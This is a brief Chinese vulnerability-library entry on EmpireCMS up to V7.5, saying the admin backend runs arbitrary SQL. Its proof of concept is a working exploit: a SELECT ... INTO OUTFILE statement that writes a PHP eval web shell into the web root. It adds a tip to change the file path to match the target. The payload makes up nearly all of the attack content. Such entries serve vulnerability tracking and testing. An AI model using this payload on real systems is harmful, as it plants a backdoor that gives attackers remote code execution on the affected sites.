---
title: 'EmpireCMS'
date: Tue, 08 Sep 2020 13:42:30 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞范围

EmpireCMS <= V7.5

### 漏洞验证

由于后端没有对执行的语句做限制导致可以执行恶意sql语句。 ![](EmpireCMS/HOH@WWOHVQOVSR5K9.png) POC：

```
select '<?php @eval($_POST[1])?>' into outfile 'D:/phpstudy_pro/WWW/shell.php'
```

根据实际路径修改路径即可。 ![](EmpireCMS/7MGWYGAV0VX0AO6JNOC3.png)